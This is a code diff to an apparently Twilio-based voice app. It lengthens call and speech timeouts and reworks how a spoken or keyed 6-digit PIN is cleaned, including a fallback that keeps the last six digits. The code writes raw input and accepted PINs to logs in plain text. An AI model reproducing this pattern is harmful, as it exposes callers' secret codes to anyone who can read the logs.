@@ -132,7 +132,7 @@ def upload_csv():
         </html>
     ''', record_count=record_count)
 
-# ====================== VOICE ROUTES (Faster) ======================
+# ====================== VOICE ROUTES ======================
 
 @app.route("/voice", methods=['GET', 'POST'])
 def voice():
@@ -147,11 +147,11 @@ def voice():
 
     gather = Gather(
         action="/gather_pin",
-        num_digits=6,                    # Auto submit after 6 digits - no # needed
-        timeout=6,                       # Very short
+        num_digits=6,
+        timeout=8,
         finish_on_key="#",
         input="dtmf speech",
-        speech_timeout=2,                # Short speech timeout
+        speech_timeout=3,
         language="en-US",
         speech_model="numbers_and_commands",
         enhanced="true",
@@ -175,9 +175,10 @@ def gather_pin():
     raw = digits if digits else speech
     print(f"Raw input received: '{raw}'")
 
-    # Strong cleaning
+    # === STRONGEST CLEANING FOR MIXED INPUT ===
     pin = ''.join(filter(str.isdigit, raw))
 
+    # If not 6 digits, try full word conversion
     if len(pin) != 6 and speech:
         word_map = {
             "zero": "0", "oh": "0", "o": "0",
@@ -189,8 +190,11 @@ def gather_pin():
         converted = [word_map.get(w, '') for w in words]
         pin = ''.join(converted)
 
-    if len(pin) > 6:
-        pin = pin[-6:]
+    # Final fallback: extract ALL digits from raw input and take last 6
+    if len(pin) != 6:
+        all_digits = ''.join(filter(str.isdigit, raw))
+        if len(all_digits) >= 6:
+            pin = all_digits[-6:]   # take the last 6 digits
 
     log_call("PIN_ATTEMPT", {"raw": raw, "cleaned": pin, "length": len(pin)})
 
@@ -203,10 +207,10 @@ def gather_pin():
         gather = Gather(
             action="/gather_pin",
             num_digits=6,
-            timeout=6,
+            timeout=8,
             finish_on_key="#",
             input="dtmf speech",
-            speech_timeout=2,
+            speech_timeout=3,
             language="en-US",
             speech_model="numbers_and_commands",
             enhanced="true",
@@ -218,6 +222,7 @@ def gather_pin():
         resp.append(gather)
         return twiml_response(resp)
 
+    # Success
     active_pins[call_sid] = {"pin": pin}
     log_call("PIN_ACCEPTED", {"pin": pin})
 
@@ -240,6 +245,7 @@ def gather_pin():
     return twiml_response(resp)
 
 
+# ====================== CONFIRM & HANDLE ======================
 @app.route("/confirm_pin", methods=['POST'])
 def confirm_pin():
     digits = request.values.get('Digits', '').strip()
